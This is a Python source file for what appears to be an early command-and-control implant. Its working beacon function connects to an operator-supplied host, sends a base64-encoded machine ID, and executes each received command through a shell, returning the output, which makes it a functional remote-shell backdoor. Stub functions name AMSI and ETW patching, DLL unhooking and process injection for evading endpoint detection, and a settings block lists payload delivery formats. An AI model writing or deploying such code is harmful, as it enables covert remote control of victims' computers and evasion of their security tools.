import threading
import subprocess as sp
import socket
import uuid
import base64
import ast
import sys

def beacon_basics(ip, port):
    """ Call back to server """
    SERVER_IP = ip
    SERVER_PORT = port
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((str(SERVER_IP), int(SERVER_PORT)))
        a=hex(uuid.getnode())
        a = bytes(a, 'utf-8')
        a=base64.b64encode(a)
        print(a)
        s.sendall(a)
        while True:
            msg=s.recv(2048).decode('utf-8')
            msg = ast.literal_eval(msg)
            print("msg: " + str(msg))
            print("A: " + a.decode("utf-8"))
            output = sp.getoutput(msg.get(a.decode("utf-8")))
            print(output)
            msg = bytes(output, 'utf-8')
            s.sendall(msg)
            print(msg)



def evade_edr():
    """Calls all the EDR evading functions from the agent"""
    print("evade_edr")
    callback_stopper()
    dll_unhooker()
    amsi_patcher()
    etw_patcher()

def callback_stopper():
    """Stops the kernel-callbacks from ruining the party"""
    print("callback_stopper")

def dll_unhooker():
    """Stops the DLL-hooks from ruining the party"""
    print("dll_unhooker")

def amsi_patcher():
    """In memory protection evasion by patching"""
    print("amsi_patcher")

def etw_patcher():
    """Telemetry evasion by patching ETW's syscalls"""
    print("etw_patcher")

def process_injection():
    """Telemetry evasion by patching ETW's syscalls"""
    print("etw_patcher")

def set_settings(polling_rate, remote_host, remote_port, evasion_settings, filetype):
    """Sets the basic client settings"""
    polling_rate = 0
    remote_host = "127.0.0.1"
    remote_port = 1337
    evasion_settings = {
        'callback_evasion':'',
        'dll_unhooker':'',
        'amsi_patcher':'',
        'etw_patcher':'',
        'process_injection':''
    }
    filetype_list = ['binary', 'dll', 'excel', 'msiexec', 'wscript']
    print("set_settings")


argv = sys.argv[1:]
if len(argv) != 2:
    sys.exit(2)
else:
    ip = argv[0]
    port = argv[1]
    beacon_basics(ip,port)
